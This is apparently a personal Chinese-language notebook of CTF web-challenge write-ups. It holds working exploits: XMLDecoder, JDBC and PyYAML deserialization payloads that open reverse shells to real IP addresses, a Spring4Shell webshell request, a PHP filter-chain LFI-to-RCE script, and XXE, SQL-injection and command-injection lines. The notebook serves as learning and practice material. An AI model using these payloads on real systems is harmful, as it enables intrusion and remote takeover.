# BUU

### [FireshellCTF2020]URL TO PDF
输入url,可以转pdf,nc可以看到请求来自![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231127235158.png)
,搜索相关漏洞`weasyprint`

写一个html
```php
<html>
<body>
<link rel='attachment' href='file:///flag'>
</body>
</html>
```

需要使用`binwalk -e`分离文件才能看见flag,可以看到明显文件大小与之前不一样了





### 2023浙江大学生省赛初赛
#java 
https://www.yuque.com/dat0u/ctf/zticsggntervfyue wp
有admin路由,但是有路由限制
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231115234413.png)

看不懂后面的反序列化,只有前面的spring配置绕过
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231115234225.png)
漏洞原因在`/admin*`只匹配单层url,如`/admin/a`,`admin/**`才能匹配多级目录,所以这里属于开发失误,所谓的限制相当于null,但是需要注意请求必须有csrf_token



# NSS
### [GKCTF 2021]babycat
#java 



读取`web.xml`=>`../../WEB-INF/web.xml`

读取`../../WEB-INF/classes/com/web/servlet/registerServlet.class`
```java
//循环找到最后一个role
	String var = req.getParameter("data").replaceAll(" ", "").replace("'", "\"");
	Pattern pattern = Pattern.compile("\"role\":\"(.*?)\"");
	Matcher matcher = pattern.matcher(var);
	while (matcher.find()) {
		role = matcher.group();
	}
//替换为role的值为guest
	if (!StringUtils.isNullOrEmpty(role)) {
		person = (Person) gson.fromJson(var.replace(role, "\"role\":\"guest\""), Person.class);
	} else {
		person = (Person) gson.fromJson(var, Person.class);
		person.setRole("guest");
	}

```

- json的内联注释绕过正则匹配
`{"username":"admin","password":"password","role":"test","role"/**/:"admin"}
匹配到前一个role后替换,json解析时后面的会覆盖前面的值
- 思路二
`{"username":"admin","password":"pass","role":"admin"/*,"role":"test"*/}`
替换了最后一个role,但是属于注释部分也不会影响结果


继续读取文件,在`baseDao.class`里
```java
    public static void getConfig() throws FileNotFoundException {
        HashMap map;
        Object obj = new XMLDecoder(new FileInputStream(System.getenv("CATALINA_HOME") + "/webapps/ROOT/db/db.xml")).readObject();
        if ((obj instanceof HashMap) && (map = (HashMap) obj) != null && map.get("url") != null) {
            driver = (String) map.get("driver");
            url = (String) map.get("url");
            username = (String) map.get("username");
            password = (String) map.get("password");
        }
    }
```

> 其中 System.getenv(“CATALINA_HOME”) 可以使用前面的文件包含读取 /proc/self/environ 得到为 /usr/local/tomcat。因此可以尝试将 db.xml 覆盖为恶意代码后使用注册业务触发 XMLDecoder 反序列化。


```http
POST /home/upload HTTP/1.1
Host: node4.anna.nssctf.cn:28037
Content-Length: 645
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://node4.anna.nssctf.cn:28037
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxPRQbJFRE2whRMVh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node4.anna.nssctf.cn:28037/home/upload
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=DA6CA22348163EF6A9305C5BBCAA12AD
Connection: close

------WebKitFormBoundaryxPRQbJFRE2whRMVh
Content-Disposition: form-data; name="file"; filename="../../db/db.xml"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<java>
<object class="java.lang.&#80;rocessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>{echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMy4yMTMuNS4xODUvODAgMD4mMSc=}|{base64,-d}|{bash,-i}</string>
</void>
</array>
<void method="start"/>
</object>
</java>


------WebKitFormBoundaryxPRQbJFRE2whRMVh--
```

思路:前端注册限制绕过直接注册->存在任意文件读取->通过内联注释伪造admin用户->发现使用了`XMLDecoder`类,存在反序列化漏洞->上传文件覆盖原db.xml->注册一个用户触发
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230621235404.png)

### Spring Core RCE
#java/spring
[漏洞复现](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965)

```http
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: node4.anna.nssctf.cn:28414
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1


```

访问
`http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=id`

---
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230619212827.png)
做不了一点

### [羊城杯 2020]a_piece_of_java
#jdbc_sql 
```java
//传参username,password,序列化后存储到cookie里
  @PostMapping({"/index"})
  public String index(@RequestParam("username") String username, @RequestParam("password") String password, HttpServletResponse response) {
    UserInfo userinfo = new UserInfo();
    userinfo.setUsername(username);
    userinfo.setPassword(password);
    Cookie cookie = new Cookie("data", serialize(userinfo));
    cookie.setMaxAge(2592000);
    response.addCookie(cookie);
    return "redirect:/hello";
  }
//反序列化cookie里的内容
  @GetMapping({"/hello"})
  public String hello(@CookieValue(value = "data", required = false) String cookieData, Model model) {
    if (cookieData == null || cookieData.equals(""))
      return "redirect:/index"; 
    Info info = (Info)deserialize(cookieData);
    if (info != null)
      model.addAttribute("info", info.getAllInfo()); 
    return "hello";
  }
```

反序列化调用链:info.getAllInfo()->InfoInvocationHandler.invoke()->DatabaseInfo.checkAllInfo()->DatebaseInfo.connect()
```java
  private void connect() {
    String url = "jdbc:mysql://" + this.host + ":" + this.port + "/jdbc?user=" + this.username + "&password=" + this.password + "&connectTimeout=3000&socketTimeout=6000";
    try {
      this.connection = DriverManager.getConnection(url);
    } catch (Exception e) {
      e.printStackTrace();
    } 
  }
```
存在`serialkiller.conf`配置,限制了反序列化类白名单
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- serialkiller.conf -->
<config>
    <refresh>6000</refresh>
    <mode>
        <!-- set to 'false' for blocking mode -->
        <profiling>false</profiling>
    </mode>
    <blacklist>

    </blacklist>
    <whitelist>
        <regexp>gdufs\..*</regexp>
        <regexp>java\.lang\..*</regexp>
    </whitelist>
</config>
```

jdbc反序列化漏洞
> 当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE

需要我们自己开启一个fake_sql_server

D:\\CTF_Tools/

```java

import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;
import gdufs.challenge.web.model.Info;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws Exception{
        DatabaseInfo databaseInfo = new DatabaseInfo();
        databaseInfo.setHost("13.213.5.185");
        databaseInfo.setPort("3306");//恶意mysql服务端端口
        ///bin/bash -i >& /dev/tcp/vps/7015 0>&1   反弹shell监听的端口
//        databaseInfo.setUsername("yso_URLDNS_http://hud0xf.ceye.io");
        databaseInfo.setUsername("yso_CommonsCollections5_bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzExNS4yMzYuMTUzLjE3NC8xNjgwNiAwPiYx}|{base64,-d}|{bash,-i}");
        databaseInfo.setPassword("123&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");

        //System.out.println(databaseInfo.getUsername());
        Method getUsernameMethod = databaseInfo.getClass().getMethod("getUsername");
        String a =(String) getUsernameMethod.invoke(databaseInfo);
        //System.out.println(a);
//        Class c = Class.forName("gdufs.challenge.web.invocation.InfoInvocationHandler");
        //创建一个InfoInvocationHandler类对象
        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);
        //然后使用动态代理，我们代理的是databaseInfo，所以就要获取其类加载器和接口
        Info info =(Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);
        //序列化部分，参考MainController.java
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(info);
        oos.close();
        //将序列化结果输出
        //这里的输出语句要注意不要使用System.out.println();
        System.out.printf(new String(Base64.getEncoder().encode(baos.toByteArray())));

    }

}


```

aws忘了关防火墙了,寄半天接收不到
捋一遍思路
cookie反序列化->利用动态代理调用DatabaseInfo.connect方法->jdbc方法连接数据库,存在反序列化漏洞->伪造mysql服务,发送ysoserial产生的反弹shell的payload

---
java咋这么难😋



### [NSSRound#13 Basic]flask?jwt?
忘记密码界面泄露`secret_key`

### [NSSRound#V Team]PYRCE
```python
def waf(rce):
    black_list = '01233456789un/|{}*!;@#\n`~\'\"><=+-_ '
    for black in black_list:
        if black in rce:
            return False
    return True

@app.route('/', methods=['GET'])
def index():
    if request.args.get("Ňśś"):
        nss = request.args.get("Ňśś")
        if waf(nss):
            os.popen(nss)
        else:
            return "waf"
    return "/source"
```

#python_escape 
命令执行绕过
`cp$(cd	..&&cd	..&&cd	..&&cd	..&&cd	..&&cd	..&&echo	$(pwd)flag)	app.py`
使用flag覆盖app.py












# [VishwaCTF 2023]

### Eeezzy

```php
<?php

    session_start();
    $_SESSION['status']=null;

    $flag="";
    try {
        if (isset($_GET['username']) && isset($_GET['password'])) {
            if (strcmp($_GET['username'], $flag)==0 && strcmp($_GET['password'], $flag)==0)
                $_SESSION['status']=$flag;
            else
                $_SESSION['status']="Invalid username or password";
        }
    } catch (Throwable $th) {
        $_SESSION['status']=$flag;
    }

?>
```

![image-20230402143632411](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230402143632411.png)

根据回显也可知道会输出 $_SESSION['status'] 的内容

所以只需要抛出Throwable异常即可

payload

```
?username=0&password[]=
```

但是我不理解的是，为什么之前尝试username[] 没有成功，仅限于password单独为数组的时候才会报错

### Payload

![image-20230402145420078](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230402145420078.png)

点击system details会回显系统信息。只增加了 btn一个参数也没有值，猜测回显条件为 `isset($_GET['btn'])`

robots.txt  下存在源码，cmd可以直接执行命令

payload：

`?cmd=cat index.php`

![image-20230402150855478](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230402150855478.png)

### aLive

![image-20230402151523360](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230402151523360.png)

可以执行命令，但只会回显bool

![image-20230402152022219](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230402152022219.png)

![image-20230402152532546](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230402152532546.png)

过滤了 echo，printf写马502

接下来就是根据命令回显盲注

```py
import requests
url="https://ch431629117491.ch.eng.run/"
data={
    "domain":";test `tac ./fl*|cut -c {0}` = \"{1}\" && printf \"The characters are equal.\""
}

print(data['domain'])

flag=""
for i in range(9,20):
    for j in range(70,128):
        data={
        "domain":";test `tac ./fl*|cut -c {0}` = \"{1}\" && printf \"The characters are equal.\"".format(i,chr(j))
        }
        result=requests.post(url=url,data=data)
        # print(data["domain"].format(i,chr(j)),result.text)
        print(i,chr(j))
        if "is inactive!" in result.text:
            j+=1
        else:
            flag+=chr(j)
            print(flag)
            break
print(flag)
```

太慢了，搞出来一个非预期

payload 

```
;base64 ./fla*>shell.php
```

 访问后base64解码

`VishwaCTF{b1inD_cmd-i}`

根据flag看应该是非预期

>   赛后看了别人的wp，发现弹shell是可行的
>
>   ```shel
>   domain=`/bin/bash -c "/bin/bash -i >& /dev/tcp/[yourip]/[port] 0>&1"`
>   ```



### Mascot

除了一个前端井字棋游戏之外啥也没有

太离谱了，git泄露，不需要githacker，泄露了github地址，直接跟过去得到 flaggg.md

### spooky

看描述与第一题有关，都是一个登录框，但是没有源码了

就俩个 login.php,index.php 时间来不及了，等赛后复现了

# RITSEC CTF 2023

### Echoes

输入一串字符，判断是不是回文字符

经过测试，发现如下情况

|   输入   | 应该 | 实际 |
| :------: | :--: | :--: |
|   7*7    | yes  |  no  |
|   11*1   |  no  | yes  |
| 任意数字 |    yes/no    |yes|

有点没搞懂干嘛

echo不是回文

好像偶数个字符就会回显

![image-20230402212805203](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230402212805203.png)

第三处回显存在命令注入

payload

```
word=;cat flag*
```

真脑洞大开。。。

### Rick Roll

找到五部分flag

第一部分

```
Hey there you CTF solver, Good job on finding the actual challenge, so the task here is to find flags to complete the first half of the chorus of this song, and you
will find the flags around this entire web network in this format,/*[FLAG_PIECE]*/ Heres a piece to get started /*[RS{/\/eveRG0nna_]*/  find the next four parts of the famous chorus
```

`[|3tY0|_|d0vvn_]`

`[G1v3y0uuP_]`

`[D3s3RTy0u}]`

`[TuRna30unD_]`

就是在流量里搜索 `[`

拼接一下

```
RS{/\/eveRG0nna_G1v3y0uuP_|3tY0|_|d0vvn_TuRna30unD_D3s3RTy0u}
```

### X-Men Lore

*选择你的英雄*

一开始就在好奇明明没有传参数，怎么就知道我访问哪一个页面。=，原来是藏在cookie里，解码发现是xml，所以就是XXE

```xml
<?xml version='1.0' encoding='UTF-8'?><input><xmen>Jean Grey</xmen></input>
```

payload
#xxe 
```py
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE input [
<!ELEMENT xmen ANY>
<!ENTITY xxe SYSTEM "file:///flag">]>
<input><xmen>&xxe;</xmen></input>
```

`RS{XM3N_L0R3?_M0R3_L1K3_XM3N_3XT3RN4L_3NT1TY!}`

### Pickle Store
#pickle
看名字应该是pickle反序列化

```python
import base64
import os
import pickle

class A(object):
    def __reduce__(self):
        a = 'ls /'
        return (os.system,(a,))
a = A()
test = pickle.dumps(a)
print(base64.b64encode(test))
```

修改cookie，但是发现会强制302跳转

不会了，等wp复现了



## CTFSHOW 复现

### 被遗忘的反序列化

```php
<?php

# 根目录中有一个txt文件哦
error_reporting(0);
show_source(__FILE__);
include("check.php");

class EeE{
    public $text;
    public $eeee;
    public function __wakeup(){
        if ($this->text == "aaaa"){
            echo lcfirst($this->text);
        }
    }

    public function __get($kk){
        echo "$kk,eeeeeeeeeeeee";
    }

    public function __clone(){
        $a = new cycycycy;
        $a -> aaa();
    }
    
}

class cycycycy{
    public $a;
    private $b;

    public function aaa(){
        $get = $_GET['get'];
        $get = cipher($get);
        if($get === "p8vfuv8g8v8py"){
            eval($_POST["eval"]);
        }
    }


    public function __invoke(){
        $a_a = $this -> a;
        echo "\$a_a\$";
    }
}

class gBoBg{
    public $name;
    public $file;
    public $coos;
    private $eeee="-_-";
    public function __toString(){
        if(isset($this->name)){
            $a = new $this->coos($this->file);
            echo $a;
        }else if(!isset($this -> file)){
            return $this->coos->name;
        }else{
            $aa = $this->coos;
            $bb = $this->file;
            return $aa();
        }
    }
}   

class w_wuw_w{
    public $aaa;
    public $key;
    public $file;
    public function __wakeup(){
        if(!preg_match("/php|63|\*|\?/i",$this -> key)){
            $this->key = file_get_contents($this -> file);
        }else{
            echo "不行哦";
        }
    }

    public function __destruct(){
        echo $this->aaa;
    }

    public function __invoke(){
        $this -> aaa = clone new EeE;
    }
}

// $_ip = $_SERVER["HTTP_AAAAAA"];
// unserialize($_ip);
$a=new w_wuw_w();
$a->file="check.php";
$a->aaa=&$a->key;
echo(serialize($a));

//eval pop:EeE->__wakeup()=>gBoBg->__toString()=>w_wuw_w->__invoke()=>EeE->__clone()=>cycycycy->aaa()->eval()

//file_get_contents('check.php'):
```

当时唯一疑惑点就在读文件上，看wp好像略有繁琐，因为可以直接读取check.php,写出解密函数

```php
$a=new w_wuw_w();
$a->file="check.php";
$a->aaa=&$a->key;
echo(serialize($a));
```

这个引用确实想到过，但是当初应该是写错了&的位置

**eval pop**

```php
$a = new EeE;
$b = new gBoBg;
$c = new w_wuw_w;
$a -> text = $b;
$b -> file="a";
$b -> coos = $c;
$c -> aaa = $a;
echo serialize($a);
```

wp提到了php原生类 `GlobIterator`的用法，确实没有想到

usage:

```php
$iterator = new GlobIterator('/path/to/dir/*.txt');
foreach ($iterator as $file) {
    echo $file->getPathname() . "\n";
}
```

### easy_php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-03-24 10:16:33
# @Last Modified by:   h1xa
# @Last Modified time: 2023-03-25 00:25:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }

}

$data = $_GET['1+1>2'];

if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}


?>
```

[PHP ArrayObject serialize()实例讲解](http://www.manongjc.com/detail/30-ejjnhehhbxpwxqp.html)



payload

```
C:11:"ArrayObject":67:{x:i:0;O:7:"ctfshow":1:{s:7:"ctfshow";s:12:"cat /f1agaaa";};m:a:0:{}}
```

## HZNUCTF 2023

正好看到 NSS上了杭师大的题目，也没参加就复现一下

### ppppop

观察到cookie为base64编码的值，修改isadmin为true

```php
<?php
error_reporting(0);
include('utils.php');

class A {
    public $className;
    public $funcName;
    public $args;

    public function __destruct() {
        $class = new $this->className;
        $funcName = $this->funcName;
        $class->$funcName($this->args);
    }
}

class B {
    public function __call($func, $arg) {
        $func($arg[0]);
    }
}

if(checkUser()) {
    highlight_file(__FILE__);
    $payload = strrev(base64_decode($_POST['payload']));
    unserialize($payload);
}


```

payload

```php
$a=new A();
$a->className="B";
$a->funcName="system";
$a->args="printenv";
echo(base64_encode(strrev(serialize($a))));
```





### flask

观察到模板注入会先将字符串逆向然后在进行渲染

payload

```py
}})(daer.)'vnetnirp'(nepop.)'so'(]'__tropmi__'[__snitliub__.__slabolg__.__tini__.fles{{
```

flag在环境变量里

*真正的逆向*

### ezgo

根据提示，在cmd下post shit

![image-20230404180557158](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230404180557158.png)

可以看到会运行的环境变量下的可执行文件，使用绝对路径绕过

 `/bin/ls -l`

![image-20230404180828918](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230404180828918.png)

`/usr/bin/whoami` 发现我们是用户 ctf

读取发现没有权限，那就是提权了

弹shell 也是一直接收不到

*   suid

```
shit=find / -user root -perm -4000 -exec ls -ldb {} ; > /tmp/suid
```

一片空白

*   sudo -l

```shell
User ctf may run the following commands on 362a742042d64fd4:
    (root) NOPASSWD: /usr/bin/find
```

payload

```shell
shit=/usr/bin/sudo /usr/bin/find  . -exec /bin/cat /flag \; -quit
```

*所以和 `go` 有什么关系*

### eznode

提示 `post json`

这比赛好喜欢 `shit`

根据提示第一步就是找到源码

![image-20230404193225189](C:\Users\20925\AppData\Roaming\Typora\typora-user-images\image-20230404193225189.png)

报个错，什么也没发现，实在做不下去

### guessguessguess

没思路，输入 `tinh`会有彩蛋已经极限了

### pickle

pickle反序列化，过滤了 os,想着用 subprocess，但是500

经过大量测试，命令中禁了一堆特殊字符且只有bool回显

过滤的字符`  > < `

*   思路一：命令盲注

感觉这个思路难度还是比较大的，因为缺少很多字符，%09也过滤了

os过滤了可以使用 subprocess 绕过，可以探测有哪些命令可用，不知道这个任意文件读取怎么利用，没思路了。。

而且`__reduce__`只能执行一条命令

## 24h@CTF '23

### Shopping

题目给了源码

login.php 存在sql注入

```php
<?php
   session_start();
   include("config.php");
   
   if (isset($_SESSION['user'])){
      header("Location: index.php");
   }

   $error = "";
   if($_SERVER["REQUEST_METHOD"] == "POST") {
      
      $username = mysqli_real_escape_string($db,$_POST['username']);
      $password = mysqli_real_escape_string($db,$_POST['password']); 
      
      $sql = "SELECT username FROM users WHERE BINARY username = '$username' and password = '$password'";
      
      $result = mysqli_query($db,$sql);
      
      
      if ($row = mysqli_fetch_assoc($result)) {
         $_SESSION['user'] = $row['username'];
         header("Location: index.php");
      } else {
         $error = "Your Login Name or Password is invalid";
      }

   }
?>
```

使用报错注入得到admin的密码

```
1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'),0x7e),1) #
```

后面密码长度不够可以使用 left和right函数截断

password yK4TcEhLLkrYr6fymRKxZ4C4KopPx4yL5H

addproduct.php存在文件包含,应该是要拿shell或者通过sql拿到/opt下flag的具体文件名,但是找不到进一步利用点了,sql写文件也没有权限



```php
<?php
// Start session
session_start();
require_once 'config.php';


if (!isset($_SESSION['user']) && $_SESSION['user'] != 'admin') {
    header('Location: index.php');
}

$product_name = trim($_GET['product_name']);
$product_description = trim($_GET['product_description']);
$product_price = $_GET['product_price'];
$errors = [];

if (empty($product_name)) {
    $errors[] = 'Please enter a product name.';
}

if (empty($product_description)) {
    $errors[] = 'Please enter a product description.';
}

if (empty($product_price) || !is_numeric($product_price)) {
    $errors[] = 'Please enter a valid product price.';
}


if (empty($errors)) {
    $stmt = $db->prepare('INSERT INTO products (product_name, product_description, product_price) VALUES (?, ?, ?)');
    $stmt->bind_param('ssd', $product_name, $product_description, $product_price);
    $stmt->execute();
}
$db->close();
if (! empty($_GET['role'])){
    $_SESSION['role'] = $_GET['role'];
    include($_GET['role']);
}
?>
```
---

 *赛后*
#lfi2rce
从 LFI 到 RCE，利用filter，这wp还没看懂

先贴脚本

```python
import requests

url = "http://challenges.polycyber.io:8000/addproduct.php"
file_to_use = "/etc/passwd"
command = "cat /opt/4c9ef90fdcdd387456f56cd2d275a7f5"

#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}


# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={
    "0": command,
    "role": final_payload
})

print(r.text)
```

https://tttang.com/archive/1395/#toc_0x00-tldr

参考这篇文章,也就是利用filter编码转换构造字符,base64 decode会忽略非base64字符,构造webshell



## HDCTF

### Yami

存在任意文件读取,过滤了app.py,双url编码绕过

```
?url=file:///%25%36%31%25%37%30%25%37%30/%25%36%31%25%37%30%25%37%30.py
```

源码

```python
#encoding:utf-8
import os
import re, random, uuid
from flask import *
from werkzeug.utils import *
import yaml
from urllib.request import urlopen
app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = False
BLACK_LIST=["yaml","YAML","YML","yml","yamiyami"]
app.config['UPLOAD_FOLDER']="/app/uploads"

@app.route('/')
def index():
    session['passport'] = 'YamiYami'
    return '''
    Welcome to HDCTF2023 <a href="/read?url=https://baidu.com">Read somethings</a>
    <br>
    Here is the challenge <a href="/upload">Upload file</a>
    <br>
    Enjoy it <a href="/pwd">pwd</a>
    '''
@app.route('/pwd')
def pwd():
    return str(pwdpath)
@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('app.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m:
            return "re.findall('app.*', url, re.IGNORECASE)"
        if n:
            return "re.findall('flag', url, re.IGNORECASE)"
        res = urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
    return 'no response'

def allowed_file(filename):
   for blackstr in BLACK_LIST:
       if blackstr in filename:
           return False
   return True
@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return "Empty file"
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            if not os.path.exists('./uploads/'):
                os.makedirs('./uploads/')
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return "upload successfully!"
    return render_template("index.html")
@app.route('/boogipop')
def load():
    if session.get("passport")=="Welcome To HDCTF2023":
        LoadedFile=request.args.get("file")
        if not os.path.exists(LoadedFile):
            return "file not exists"
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
        return "van you see"
    else:
        return "No Auth bro"
if __name__=='__main__':
    pwdpath = os.popen("pwd").read()
    app.run(
        debug=False,
        host="0.0.0.0"
    )
    print(app.config['SECRET_KEY'])

```

1.   伪造session

     ```
     import random,uuid
     
     random.seed(int("02:42:ac:02:48:6d".replace(":",""),16))
     print(str(random.random()*233))
     
     
     
     ```

2.   yaml 反序列化

     ```yaml
     !!python/object/new:str
     	args: []
     	state: !!python/tuple
     	  - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/115.236.153.174/16806 <&1\"')"
     	  - !!python/object/new:staticmethod
     		args: []
     		state:
     		  update: !!python/name:eval
     		  items: !!python/name:list
     ```

     上传文件反序列化一直500

